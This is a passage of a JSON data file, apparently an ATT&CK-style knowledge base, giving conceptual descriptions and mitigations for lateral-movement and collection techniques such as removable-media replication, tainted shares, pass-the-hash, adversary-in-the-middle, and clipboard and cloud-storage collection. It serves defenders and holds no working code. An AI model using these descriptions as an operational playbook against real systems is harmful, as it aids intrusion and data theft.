            {
              "type": "text",
              "content": "Limit the accounts that may use remote services. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1091",
    "name": "Replication Through Removable Media",
    "tactics": [
      { "id": "TA0008", "name": "Lateral Movement" },
      { "id": "TA0001", "name": "Initial Access" }
    ],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself."
        }
      ],
      [
        {
          "type": "text",
          "content": "Mobile devices may also be used to infect PCs with malware if connected via USB. This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to block unsigned/untrusted executable files (such as .exe, .dll, or .scr) from running from USB removable drives. "
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable Autorun if it is unnecessary.  Disallow or restrict removable media at an organizational policy level if it is not required for business operations. "
            }
          ]
        ]
      },
      {
        "id": "M1034",
        "name": "Limit Hardware Installation",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit the use of USB devices and removable media within a network."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1072",
    "name": "Software Deployment Tools",
    "tactics": [
      { "id": "TA0002", "name": "Execution" },
      { "id": "TA0008", "name": "Lateral Movement" }
    ],
    "subs": [],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).  "
        }
      ],
      [
        {
          "type": "text",
          "content": "Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. Network infrastructure may also have administration tools that can be similarly abused by adversaries. "
        }
      ],
      [
        {
          "type": "text",
          "content": "The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper system and access isolation for critical network systems through use of group policy."
            }
          ]
        ]
      },
      {
        "id": "M1033",
        "name": "Limit Software Installation",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict the use of third-party software suites installed within an enterprise network. "
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper system and access isolation for critical network systems through use of multi-factor authentication."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper system isolation for critical network systems through use of firewalls."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Verify that account credentials that may be used to access deployment systems are unique and not used throughout the enterprise network."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Grant access to application deployment systems only to a limited number of authorized administrators."
            }
          ]
        ]
      },
      {
        "id": "M1029",
        "name": "Remote Data Storage",
        "description": [
          [
            {
              "type": "text",
              "content": "If the application deployment system can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the application deployment system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Patch deployment systems regularly to prevent potential remote access through Exploitation for Privilege Escalation."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that any accounts used by third-party providers to access these systems are traceable to the third-party and are not used throughout the network or used by other third-party providers in the same environment. Ensure there are regular reviews of accounts provisioned to these systems to verify continued business need, and ensure there is governance to trace de-provisioning of access that is no longer required. Ensure proper system and access isolation for critical network systems through use of account privilege separation."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Have a strict approval policy for use of deployment systems."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1080",
    "name": "Taint Shared Content",
    "tactics": [{ "id": "TA0008", "name": "Lateral Movement" }],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally."
        }
      ],
      [
        {
          "type": "text",
          "content": "A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "Antivirus/Antimalware",
        "description": [
          [
            {
              "type": "text",
              "content": "Anti-virus can be used to automatically quarantine suspicious files."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Identify potentially malicious software that may be used to taint content or may result from it and audit and/or block the unknown programs by using application control  tools, like AppLocker,   or Software Restriction Policies  where appropriate. "
            }
          ]
        ]
      },
      {
        "id": "M1050",
        "name": "Exploit Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Use utilities that detect or mitigate common features used in exploitation, such as the Microsoft Enhanced Mitigation Experience Toolkit (EMET)."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Protect shared folders by minimizing users who have write access."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1550",
    "name": "Use Alternate Authentication Material",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0008", "name": "Lateral Movement" }
    ],
    "subs": [
      { "id": "T1550.001", "name": "Application Access Token" },
      { "id": "T1550.002", "name": "Pass the Hash" },
      { "id": "T1550.003", "name": "Pass the Ticket" },
      { "id": "T1550.004", "name": "Web Session Cookie" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process."
        }
      ],
      [
        {
          "type": "text",
          "content": "Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform Lateral Movement between systems."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce the principle of least-privilege. Do not allow a domain user to be in the local administrator group on multiple systems."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1557",
    "name": "Adversary-in-the-Middle",
    "tactics": [
      { "id": "TA0006", "name": "Credential Access" },
      { "id": "TA0009", "name": "Collection" }
    ],
    "subs": [
      { "id": "T1557.001", "name": "LLMNR/NBT-NS Poisoning and SMB Relay" },
      { "id": "T1557.002", "name": "ARP Cache Poisoning" },
      { "id": "T1557.003", "name": "DHCP Spoofing" }
    ],
    "version": "2.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions."
        }
      ],
      [
        {
          "type": "text",
          "content": "For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware. Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies. Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses and/or in support of a Network Denial of Service."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable legacy network protocols that may be used   to intercept network traffic if applicable, especially those that are not needed within an environment."
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Use network appliances and host-based security software to block network traffic that is not necessary within the environment, such as legacy protocols that may be leveraged for AiTM conditions."
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit access to network infrastructure and resources that can be used to reshape traffic or otherwise produce AiTM conditions."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of AiTM activity."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Train users to be suspicious about certificate errors. Adversaries may use their own certificates in an attempt to intercept HTTPS traffic. Certificate errors may arise when the application’s certificate does not match the one expected by the host."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1560",
    "name": "Archive Collected Data",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [
      { "id": "T1560.001", "name": "Archive via Utility" },
      { "id": "T1560.002", "name": "Archive via Library" },
      { "id": "T1560.003", "name": "Archive via Custom Method" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender."
        }
      ],
      [
        {
          "type": "text",
          "content": "Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "System scans can be performed to identify unauthorized archival utilities."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1123",
    "name": "Audio Capture",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information."
        }
      ],
      [
        {
          "type": "text",
          "content": "Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1119",
    "name": "Automated Collection",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. "
        }
      ],
      [
        {
          "type": "text",
          "content": "This technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. Strong passwords should be used on certain encrypted documents that use them to prevent offline cracking through Brute Force techniques."
            }
          ]
        ]
      },
      {
        "id": "M1029",
        "name": "Remote Data Storage",
        "description": [
          [
            {
              "type": "text",
              "content": "Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1185",
    "name": "Browser Session Hijacking",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [],
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques."
        }
      ],
      [
        {
          "type": "text",
          "content": "A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. Executing browser-based behaviors such as pivoting may require specific process permissions, such as "
        },
        { "type": "code", "content": "SeDebugPrivilege" },
        {
          "type": "text",
          "content": " and/or high-integrity/administrator rights."
        }
      ],
      [
        {
          "type": "text",
          "content": "Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Since browser pivoting requires a high integrity process to launch from, restricting user permissions and addressing Privilege Escalation and Bypass User Account Control opportunities can limit the exposure to this technique."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Close all browser sessions regularly and when they are no longer needed."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1115",
    "name": "Clipboard Data",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. "
        }
      ],
      [
        {
          "type": "text",
          "content": "For example, on Windows adversaries can access clipboard data by using "
        },
        { "type": "code", "content": "clip.exe" },
        { "type": "text", "content": " or " },
        { "type": "code", "content": "Get-Clipboard" },
        {
          "type": "text",
          "content": ". Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., Transmitted Data Manipulation)."
        }
      ],
      [
        {
          "type": "text",
          "content": "macOS and Linux also have commands, such as "
        },
        { "type": "code", "content": "pbpaste" },
        { "type": "text", "content": ", to grab clipboard contents." }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1530",
    "name": "Data from Cloud Storage",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [],
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may access data from cloud storage."
        }
      ],
      [
        {
          "type": "text",
          "content": "Many IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. "
        }
      ],
      [
        {
          "type": "text",
          "content": "In some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the Cloud API. In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., Data from Information Repositories). "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions."
        }
      ],
      [
        {
          "type": "text",
          "content": "This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources."
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Encrypt data stored at rest in cloud storage. Managed encryption keys can be rotated by most providers. At a minimum, ensure an incident response plan to storage breach includes rotating the keys and test for impact on client applications."
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP allowlisting along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data."
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider using multi-factor authentication to restrict access to resources and cloud storage APIs."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Use access control lists on storage systems and objects."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1602",
    "name": "Data from Configuration Repository",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [
      { "id": "T1602.001", "name": "SNMP (MIB Dump)" },
      { "id": "T1602.002", "name": "Network Device Configuration Dump" }
    ],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure SNMPv3 to use the highest level of security (authPriv) available."
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Apply extended ACLs to block unauthorized protocols outside the trusted network."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure intrusion prevention devices to detect SNMP queries and commands from unauthorized sources."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Segregate SNMP traffic on a separate management network."
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Allowlist MIB objects and implement SNMP views."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Keep system images and software updated and migrate to SNMPv3."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1213",
    "name": "Data from Information Repositories",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [
      { "id": "T1213.001", "name": "Confluence" },
      { "id": "T1213.002", "name": "Sharepoint" },
      { "id": "T1213.003", "name": "Code Repositories" }
    ],
    "version": "3.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. "
        }
      ],
      [
        {
          "type": "text",
          "content": "The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:"
        }
      ],
      [
        { "type": "li", "content": "Policies, procedures, and standards" },
        { "type": "li", "content": "Physical / logical network diagrams" },
        { "type": "li", "content": "System architecture diagrams" },
        { "type": "li", "content": "Technical system documentation" },
        { "type": "li", "content": "Testing / development credentials" },
        { "type": "li", "content": "Work / project schedules" },
        { "type": "li", "content": "Source code snippets" },
        {
          "type": "li",
          "content": "Links to network shares and other internal resources"
        }
      ],
      [
        {
          "type": "text",
          "content": "Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as Sharepoint and Confluence, specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider periodic review of accounts and privileges for critical and sensitive repositories."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Develop and publish policies that define acceptable information to be stored in repositories."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1005",
    "name": "Data from Local System",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [],
    "version": "1.6",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1057",
        "name": "Data Loss Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Data loss prevention can restrict access to sensitive data and detect sensitive data that is unencrypted."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1039",
    "name": "Data from Network Shared Drive",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1025",
    "name": "Data from Removable Media",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Some adversaries may also use Automated Collection on removable media."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1057",
        "name": "Data Loss Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Data loss prevention can restrict access to sensitive data and detect sensitive data that is unencrypted."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1074",
    "name": "Data Staged",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [
      { "id": "T1074.001", "name": "Local Data Staging" },
      { "id": "T1074.002", "name": "Remote Data Staging" }
    ],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location."
        }
      ],
      [
        {
          "type": "text",
          "content": "In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1114",
    "name": "Email Collection",
    "tactics": [{ "id": "TA0009", "name": "Collection" }],
    "subs": [
      { "id": "T1114.001", "name": "Local Email Collection" },
      { "id": "T1114.002", "name": "Remote Email Collection" },
      { "id": "T1114.003", "name": "Email Forwarding Rule" }
    ],
    "version": "2.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Enterprise email solutions have monitoring mechanisms that may include the ability to audit auto-forwarding rules on a regular basis."
            }
          ],
          [
            {
              "type": "text",
              "content": "In an Exchange environment, Administrators can use Get-InboxRule to discover and remove potentially malicious auto-forwarding rules. "
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages."
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use of multi-factor authentication for public-facing webmail servers is a recommended best practice to minimize the usefulness of usernames and passwords to adversaries."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1056",
    "name": "Input Capture",
    "tactics": [
      { "id": "TA0009", "name": "Collection" },
      { "id": "TA0006", "name": "Credential Access" }
    ],
    "subs": [
